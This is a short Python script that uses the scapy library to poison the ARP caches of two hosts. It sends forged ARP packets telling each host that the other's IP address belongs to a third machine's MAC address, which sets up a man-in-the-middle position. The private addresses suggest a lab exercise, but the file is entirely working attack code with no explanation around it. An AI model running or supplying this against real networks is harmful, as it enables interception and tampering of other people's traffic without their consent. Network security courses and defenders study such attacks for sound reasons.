#!/usr/bin/python3

from scapy.all import *
from scapy.layers.l2 import Ether, ARP

A_IP='10.0.2.15'
A_MAC='08:00:27:e9:cd:6b'
B_IP='10.0.2.4'
B_MAC='08:00:27:af:c0:73'
M_IP='10.0.2.5'
M_MAC='08:00:27:de:41:03'

def send_arp_request(src_mac,src_ip,dst_mac,dst_ip):
    E = Ether(dst=dst_mac, src=src_mac)
    A = ARP(hwsrc=src_mac, psrc=src_ip, hwdst=dst_mac, pdst=dst_ip)
    #construct and send ARP packet
    p = E / A
    p.show()
    sendp(p)

#Poision A's ARP cache with M's MAC and B's IP address
send_arp_request(src_mac=M_MAC,src_ip=B_IP,dst_mac=A_MAC,dst_ip=A_IP)
#Poision B's ARP cache with M's MAC and A's IP address
send_arp_request(src_mac=M_MAC,src_ip=A_IP,dst_mac=B_MAC,dst_ip=B_IP)

